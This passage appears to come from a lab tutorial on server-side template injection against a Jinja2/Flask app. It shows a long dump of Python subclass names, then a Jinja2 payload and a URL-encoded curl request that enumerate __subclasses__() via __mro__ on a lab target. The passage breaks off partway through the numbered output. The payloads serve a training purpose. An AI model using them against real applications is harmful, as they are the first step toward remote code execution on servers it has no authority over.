&amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;tempfile.TemporaryDirectory&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;urllib.request.Request&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;urllib.request.OpenerDirector&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;urllib.request.BaseHandler&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;urllib.request.HTTPPasswordMgr&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;urllib.request.AbstractBasicAuthHandler&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;urllib.request.AbstractDigestAuthHandler&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;urllib.request.URLopener&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;urllib.request.ftpwrapper&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;http.cookiejar.Cookie&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;http.cookiejar.CookiePolicy&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;http.cookiejar.Absent&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;http.cookiejar.CookieJar&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;werkzeug.datastructures.ImmutableListMixin&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;werkzeug.datastructures.ImmutableDictMixin&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;werkzeug.datastructures._omd_bucket&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;werkzeug.datastructures.Headers&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;werkzeug.datastructures.ImmutableHeadersMixin&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;werkzeug.datastructures.IfRange&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;werkzeug.datastructures.Range&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;werkzeug.datastructures.ContentRange&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;werkzeug.datastructures.FileStorage&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;dataclasses._HAS_DEFAULT_FACTORY_CLASS&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;dataclasses._MISSING_TYPE&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;dataclasses._FIELD_BASE&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;dataclasses.InitVar&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;dataclasses.Field&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;dataclasses._DataclassParams&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;werkzeug.sansio.multipart.Event&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;werkzeug.sansio.multipart.MultipartDecoder&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;werkzeug.sansio.multipart.MultipartEncoder&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;importlib.abc.Finder&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;importlib.abc.Loader&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;importlib.abc.ResourceReader&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;pkgutil.ImpImporter&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;pkgutil.ImpLoader&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;hmac.HMAC&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;werkzeug.wsgi.ClosingIterator&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;werkzeug.wsgi.FileWrapper&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;werkzeug.wsgi._RangeWrapper&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;werkzeug.utils.HTMLBuilder&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;werkzeug.wrappers.accept.AcceptMixin&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;werkzeug.wrappers.auth.AuthorizationMixin&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;werkzeug.wrappers.auth.WWWAuthenticateMixin&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;_json.Scanner&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;_json.Encoder&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;json.decoder.JSONDecoder&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;json.encoder.JSONEncoder&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;werkzeug.formparser.FormDataParser&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;werkzeug.formparser.MultiPartParser&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;werkzeug.user_agent.UserAgent&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;werkzeug.useragents._UserAgentParser&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;werkzeug.sansio.request.Request&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;werkzeug.wrappers.request.StreamOnlyMixin&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;werkzeug.sansio.response.Response&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;werkzeug.wrappers.response.ResponseStream&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;werkzeug.wrappers.response.ResponseStreamMixin&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;werkzeug.wrappers.common_descriptors.CommonRequestDescriptorsMixin&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;werkzeug.wrappers.common_descriptors.CommonResponseDescriptorsMixin&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;werkzeug.wrappers.etag.ETagRequestMixin&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;werkzeug.wrappers.etag.ETagResponseMixin&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;werkzeug.wrappers.user_agent.UserAgentMixin&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;werkzeug.test._TestCookieHeaders&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;werkzeug.test._TestCookieResponse&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;werkzeug.test.EnvironBuilder&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;werkzeug.test.Client&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;decimal.Decimal&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;decimal.Context&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;decimal.SignalDictMixin&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;decimal.ContextManager&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;numbers.Number&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;uuid.UUID&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;_pickle.Unpickler&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;_pickle.Pickler&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;_pickle.Pdata&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;_pickle.PicklerMemoProxy&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;_pickle.UnpicklerMemoProxy&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;pickle._Framer&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;pickle._Unframer&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;pickle._Pickler&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;pickle._Unpickler&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;jinja2.bccache.Bucket&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;jinja2.bccache.BytecodeCache&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;jinja2.utils.MissingType&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;jinja2.utils.LRUCache&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;jinja2.utils.Cycler&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;jinja2.utils.Joiner&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;jinja2.utils.Namespace&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;jinja2.nodes.EvalContext&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;jinja2.nodes.Node&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;jinja2.visitor.NodeVisitor&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;jinja2.idtracking.Symbols&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;jinja2.compiler.MacroRef&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;jinja2.compiler.Frame&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;jinja2.runtime.TemplateReference&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;jinja2.runtime.Context&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;jinja2.runtime.BlockReference&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;jinja2.runtime.LoopContext&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;jinja2.runtime.Macro&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;jinja2.runtime.Undefined&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;ast.NodeVisitor&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;jinja2.lexer.Failure&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;jinja2.lexer.TokenStreamIterator&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;jinja2.lexer.TokenStream&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;jinja2.lexer.Lexer&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;jinja2.parser.Parser&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;jinja2.environment.Environment&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;jinja2.environment.Template&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;jinja2.environment.TemplateModule&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;jinja2.environment.TemplateExpression&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;jinja2.environment.TemplateStream&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;jinja2.loaders.BaseLoader&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;werkzeug.local.Local&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;werkzeug.local.LocalStack&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;werkzeug.local.LocalManager&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;werkzeug.local._ProxyLookup&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;werkzeug.local.LocalProxy&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;difflib.SequenceMatcher&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;difflib.Differ&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;difflib.HtmlDiff&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;pprint._safe_key&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;pprint.PrettyPrinter&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;werkzeug.routing.RuleFactory&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;werkzeug.routing.RuleTemplate&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;werkzeug.routing.BaseConverter&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;werkzeug.routing.Map&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;werkzeug.routing.MapAdapter&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;gettext.NullTranslations&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;click._compat._FixupStream&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;click._compat._AtomicFile&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;click.utils.LazyFile&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;click.utils.KeepOpenFile&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;click.utils.PacifyFlushWrapper&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;click.types.ParamType&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;click.parser.Option&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;click.parser.Argument&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;click.parser.ParsingState&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;click.parser.OptionParser&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;click.formatting.HelpFormatter&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;click.core.Context&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;click.core.BaseCommand&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;click.core.Parameter&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;flask.signals.Namespace&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;flask.signals._FakeSignal&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;flask.cli.DispatchingApp&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;flask.cli.ScriptInfo&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;flask.config.ConfigAttribute&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;flask.ctx._AppCtxGlobals&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;flask.ctx.AppContext&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;flask.ctx.RequestContext&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;flask.scaffold.Scaffold&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;itsdangerous._json._CompactJSON&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;itsdangerous.signer.SigningAlgorithm&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;itsdangerous.signer.Signer&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;itsdangerous.serializer.Serializer&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;flask.json.tag.JSONTag&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;flask.json.tag.TaggedJSONSerializer&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;flask.sessions.SessionInterface&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;flask.blueprints.BlueprintSetupState&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;unicodedata.UCD&amp;#<span class="hljs-number">39</span>;&amp;gt;, &amp;lt;<span class="hljs-keyword">class</span> &amp;#<span class="hljs-number">39</span>;__future__._Feature&amp;#<span class="hljs-number">39</span>;&amp;gt;]&lt;/a&gt;
                &lt;br/&gt;
                &lt;input type=<span class="hljs-string">"submit"</span> value=<span class="hljs-string">"execute"</span>&gt;
            &lt;/form&gt;
        &lt;/div&gt;
&lt;SNIP&gt;
&lt;/body&gt;
</code></pre>
<p>Let us print out the number and the method names using the following payload.</p>
<pre><code class="lang-python">{% for i in range(<span class="hljs-number">450</span>) %} 
{{ i }}
{{ ''.__class__.__mro__[<span class="hljs-number">1</span>].__subclasses__()[i].__name__ }} 
{% endfor %}
</code></pre>
<pre><code class="lang-shell-session">root@htb[/htb]$ curl -gs "http://&lt;TARGET IP&gt;:&lt;PORT&gt;/execute?cmd=%7B%25%20for%20i%20in%20range%28450%29%20%25%7D%20%7B%7B%20i%20%7D%7D%20%7B%7B%20%27%27.__class__.__mro__%5B1%5D.__subclasses__%28%29%5Bi%5D.__name__%20%7D%7D%20%7B%25%20endfor%20%25%7D"

&lt;SNIP&gt;
&lt;body&gt;
    &lt;div id="desktop"&gt;
        &lt;div class="window" data-title="Run"&gt;
            &lt;form action="/execute" method="get"&gt;
                &lt;a&gt;C:\&gt;&lt;input type="text" name="cmd" id="command"&gt;&lt;/a&gt;
                &lt;br/&gt;
                &lt;a&gt;<span class="hljs-number"> 0 </span>type <span class="hljs-number"> 1 </span>weakref <span class="hljs-number"> 2 </span>weakcallableproxy <span class="hljs-number"> 3 </span>weakproxy <span class="hljs-number"> 4 </span>int <span class="hljs-number"> 5 </span>bytearray <span class="hljs-number"> 6 </span>bytes <span class="hljs-number"> 7 </span>list <span class="hljs-number"> 8 </span>NoneType <span class="hljs-number"> 9 </span>NotImplementedType <span class="hljs-number"> 10 </span>traceback <span class="hljs-number"> 11 </span>super <span class="hljs-number"> 12 </span>range <span class="hljs-number"> 13 </span>dict <span class="hljs-number"> 14 </span>dict_keys <span class="hljs-number"> 15 </span>dict_values <span class="hljs-number"> 16 </span>dict_items <span class="hljs-number"> 17 </span>dict_reversekeyiterator <span class="hljs-number"> 18 </span>dict_reversevalueiterator <span class="hljs-number"> 19 </span>dict_reverseitemiterator <span class="hljs-number"> 20 </span>odict_iterator <span class="hljs-number"> 21 </span>set <span class="hljs-number"> 22 </span>str <span class="hljs-number"> 23 </span>slice <span class="hljs-number"> 24 </span>staticmethod <span class="hljs-number"> 25 </span>complex <span class="hljs-number"> 26 </span>float <span class="hljs-number"> 27 </span>frozenset <span class="hljs-number"> 28 </span>property <span class="hljs-number"> 29 </span>managedbuffer <span class="hljs-number"> 30 </span>memoryview <span class="hljs-number"> 31 </span>tuple <span class="hljs-number"> 32 </span>enumerate <span class="hljs-number"> 33 </span>reversed <span class="hljs-number"> 34 </span>stderrprinter <span 